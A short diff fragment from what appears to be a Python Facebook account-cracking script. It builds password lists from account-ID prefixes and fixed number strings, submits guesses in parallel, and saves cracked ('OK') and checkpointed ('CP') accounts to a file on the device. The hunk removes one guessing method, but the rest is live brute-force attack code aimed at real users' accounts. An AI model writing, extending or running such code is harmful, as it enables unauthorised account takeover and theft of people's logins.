@@ -139,7 +139,6 @@ def sxr_ind():
             passlist = [ids[:6],ids[:7],'57273200','57575751']
             if 'A' in sxr_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
             elif 'B' in sxr_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
-            elif 'C' in sxr_mthd:sifaxxx.submit(rndm3,ids,passlist,mthd_svr,fb)
     print(f"\n{sxrline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/SxR-IDS/ok&cp.txt{f}\n{sxrline}");exit()
 #▬▭▬▭▬▭▬▭[ SxR RANDOM NEPAL ]▬▭▬▭▬▭▬▭#
 def sxr_npl():
